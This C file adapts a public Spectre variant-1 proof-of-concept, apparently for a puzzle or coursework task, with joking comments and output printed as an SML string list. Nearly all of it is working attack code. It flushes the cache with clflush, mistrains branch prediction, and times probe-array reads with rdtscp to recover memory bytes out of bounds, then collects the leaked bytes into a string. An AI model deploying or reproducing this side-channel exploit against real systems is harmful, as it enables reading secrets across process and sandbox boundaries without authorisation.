// Spectre exploit code from
// https://github.com/chaitanyarahalkar/Spectre-PoC/blob/master/spectre.c
// Cleaned up to make it worse style

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <x86intrin.h>

// Man this library is so useful
#include "bestlib.h"

#include "sort.h"

void do_the_thing(unsigned long m, char v[2], int s[2]) {
  static int r[256];
  int t, i, j, k, mix_i, junk = 0;
  unsigned long tx, x;
  register unsigned long t1, t2;
  volatile char *addr;

  for (i = 0; i < 256; i++)
    r[i] = 0;
  for (t = 999; t > 0; t--) {
    for (i = 0; i < 256; i++)
      _mm_clflush(&array2[i * 512]);

    tx = t % array1_size;
    for (j = 29; j >= 0; j--) {
      _mm_clflush(&array1_size);
      for (volatile int z = 0; z < 100; z++) {
      }

      x = ((j % 6) - 1) & ~0xFFFF;
      x = (x | (x >> 16));
      x = tx ^ (x & (m ^ tx));

      meme(x);
    }

    for (i = 0; i < 256; i++) {
      mix_i = ((i * 167) + 13) & 255;
      addr = &array2[mix_i * 512];
      t1 = __rdtscp(&junk);
      junk = *addr;
      t2 = __rdtscp(&junk) - t1;
      if (t2 <= 80 && mix_i != array1[t % array1_size])
        r[mix_i]++;
    }

    j = k = -1;
    for (i = 0; i < 256; i++) {
      if (j < 0 || r[i] >= r[j]) {
        k = j;
        j = i;
      } else if (k < 0 || r[i] >= r[k]) {
        k = i;
      }
    }
    if (r[j] >= (2 * r[k] + 5) || (r[j] == 2 && r[k] == 0))
      break;
  }
  r[0] ^= junk;
  v[0] = j;
  s[0] = r[j];
  v[1] = k;
  s[1] = r[k];
}

int main(int argc, char **argv) {
  // Oh no! Something's gone wrong!
  // Maybe it's that library...

  unsigned long m = (args - (char *)array1);
  int i, s[2], len = n;
  char v[2];

  for (i = 0; i < sizeof(array2); i++)
    array2[i] = 1;

  char haha[n + 1];
  memset(haha, 0, n + 1);
  int ind = 0;
  while (--len >= 0) {
    do_the_thing(m++, v, s);
    haha[ind++] = v[0];
  }

  char **sorted = sort(haha, &len);

  printf("val it = [");
  if (len > 0) {
    for (i = 0; i < len - 1; i++) {
      printf("\"%s\", ", sorted[i]);
    }
    printf("\"%s\"", sorted[len - 1]);
  }
  printf("] : string list");
}